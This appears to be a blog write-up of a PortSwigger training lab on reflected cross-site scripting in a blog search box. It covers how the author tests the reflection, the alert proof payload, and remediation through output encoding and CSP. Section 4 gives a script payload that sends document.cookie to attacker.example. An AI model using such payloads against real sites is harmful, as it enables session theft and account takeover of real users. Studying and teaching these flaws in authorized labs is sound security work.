---
layout: post
title: "PortSwigger XSS — Reflected Script into HTML Context"
date: 2026-06-30 20:00:00 -0700
categories: [web, portswigger]
tags: [xss, cross-site-scripting, web, owasp, portswigger]
---

Third web bug, second class. After two rounds of [SQL injection](https://blackhawkyama.github.io/posts/portswigger-sqli-retrieve-hidden-data/)
(which attacks the *database*), this one attacks the *other users' browsers*:
**reflected cross-site scripting (XSS)**. PortSwigger lab — *Reflected XSS into HTML
context with nothing encoded.*

> **Class:** Cross-site scripting (reflected) · **Impact:** run arbitrary JS in a
> victim's browser → session/cookie theft, account takeover · **Environment:**
> deliberately-vulnerable training lab (legal, authorized).

![Reflected XSS — how an unencoded script tag executes](/assets/img/xss-reflected.svg)

## 1. The target

A blog with a search box. Searching for `test` reloads the page showing
*"0 search results for test"* — my input is **reflected** back into the HTML response.
The question every hunter asks next: *is it encoded?*

## 2. Testing the reflection

Search for something with HTML metacharacters, e.g. `<test>`. If the response contains a
literal `<test>` element (not the escaped `&lt;test&gt;`), the input is dropped into the
page **unencoded** — and I control markup, not just text.

Here, nothing is encoded. So I inject a script instead of a word:

```html
<script>alert(1)</script>
```

## 3. The exploit

Submitting that payload, the server builds a response like:

```html
<h1>0 search results for <script>alert(1)</script></h1>
```

The browser parses that as a **real `<script>` element** and executes it — `alert(1)`
fires. Code ran in the browser, from nothing but a search term. Lab solved.

## 4. Why it matters

`alert(1)` is the harmless proof. The weaponised version:

```html
<script>fetch('https://attacker.example/c?'+document.cookie)</script>
```

Craft that into a link, get a logged-in victim to click it, and their session cookie
lands on my server → **account takeover**. That's why XSS is a staple of bug-bounty
payouts.

## 5. Remediation

| Root cause | Fix |
|------------|-----|
| User input reflected into HTML unencoded | **Context-aware output encoding** (HTML-encode `< > " ' &`) |
| Browser trusts injected markup | **Content-Security-Policy** to restrict inline script |
| No input hygiene | Validate/allowlist where feasible (defense in depth) |

The core rule mirrors SQLi's: **never drop untrusted input into a trusted context
verbatim.** For SQL it's parameterised queries; for HTML it's output encoding.

*Performed against a legal, authorized PortSwigger Web Security Academy lab.*
